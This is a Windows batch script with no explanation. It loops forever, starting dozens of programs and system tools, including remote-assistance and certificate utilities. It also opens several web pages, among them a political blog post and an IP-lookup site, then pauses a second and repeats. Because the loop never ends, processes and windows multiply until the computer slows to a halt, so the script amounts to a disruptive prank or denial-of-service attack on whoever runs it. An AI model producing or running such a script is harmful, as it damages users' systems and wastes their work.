:loop
start cmd.exe /k ipconfig
start microsoft.windows.camera:
start iexplore.exe
start osk.exe
start mspaint.exe
start "C:\Program Files (x86)\BRS\rapture3dgame.chm"
start "C:\Program Files (x86)\BRS\UserLayout.exe"
start notepad.exe
start spoolsv.exe
start write.exe
start cliconfg.exe
start colorcpl.exe
start calc.exe
start magnify.exe
start cmstp.exe
start certmgr.msc
start mstsc.exe
start changepk.exe
start certreq.exe
start msra.exe
start charmap.exe
start psr.exe
start WFS.exe
start quickassist.exe
start "C:\Windows\Speech\Common\sapisvr.exe" 
start "C:\Program Files\Common Files\Microsoft Shared\Ink\mip.exe"
start "" "https://lukyrh.blogspot.com/2021/12/tercera-guerra-mundial-vs-guerra-civil.html"
start "" "https://whatsmyip.com" 
start "" "https://www.zbw.eu/econis-archiv/bitstream/11159/444850/1/EBP076512657_0.pdf	"
start "" "https://www.ssab.com/en"
start "" "https://www.discoverleveson.com/evidence/KRM17_Document_75/6057/media"
Timeout /t 1 /nobreak >nul
taskkill /F /IM magnify.exe
goto loop                           